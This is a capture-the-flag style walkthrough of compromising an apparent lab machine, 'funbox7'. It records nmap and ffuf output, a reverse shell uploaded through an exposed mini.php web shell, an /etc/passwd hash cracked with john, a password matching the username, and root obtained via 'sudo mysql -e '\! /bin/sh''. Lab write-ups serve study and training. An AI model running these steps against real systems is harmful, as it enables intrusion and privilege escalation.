## MACHINE IP
```bash
192.168.167.132
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Fri Nov  7 18:16:17 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 192.168.167.132
Nmap scan report for 192.168.167.132
Host is up (0.22s latency).
Not shown: 64495 closed tcp ports (reset), 1038 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  7 18:17:18 2025 -- 1 IP address (1 host up) scanned in 61.23 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
## RECON
```bash
# Operating System               // Found Post Initial Enumeration
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.5 LTS"
NAME="Ubuntu"
VERSION="18.04.5 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.5 LTS"
VERSION_ID="18.04"

```
## ENUMERATION
```bash
# Port 80
sudo whatweb -v $url
Summary   : Apache[2.4.29], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)]

# Fuzzing 
sudo ffuf -r -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 404 -e .php,.txt -u $url/FUZZ | tee fuzz/ffuf-big
htpasswd.txt           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 218ms]
.htaccess.txt           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 218ms]
.htaccess.php           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 218ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 218ms]
.htpasswd.php           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 218ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 218ms]
javascript              [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 219ms]
mini.php                [Status: 200, Size: 3828, Words: 152, Lines: 115, Duration: 221ms]
phpmyadmin              [Status: 200, Size: 10531, Words: 504, Lines: 26, Duration: 231ms]
robots.txt              [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 219ms]
robots.txt              [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 220ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 221ms]

http://192.168.167.132/mini.php
- Had Zerion Mini Shell 1.0
- Upload php-reverse-shell.php and change permission using chmod and execute starting a listener
```
## INITIAL SHELL
```bash
sudo nc -nvlp 80    
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.45.215] from (UNKNOWN) [192.168.167.132] 35998
Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:18:43 up 36 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```
## PRIVILEGE ESCALATION
```bash
cat /etc/passwd
- Has oracle user password hash unshadowed
- cracked using john
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes
[sudo] password for kali: 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hiphop           (oracle)     
1g 0:00:00:00 DONE (2025-11-07 18:53) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

su oracle

# Same username as password
su goat
Password: goat
- Worked !!!

goat@funbox7:/home$ sudo -l
Matching Defaults entries for goat on funbox7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goat may run the following commands on funbox7:
    (root) NOPASSWD: /usr/bin/mysql
    
# GTFOBINS   
```
## ROOT | ADMINISTRATOR - PWNED
```bash
goat@funbox7:/home$     sudo mysql -e '\! /bin/sh'
# id
id: not found
# whoami
root
```
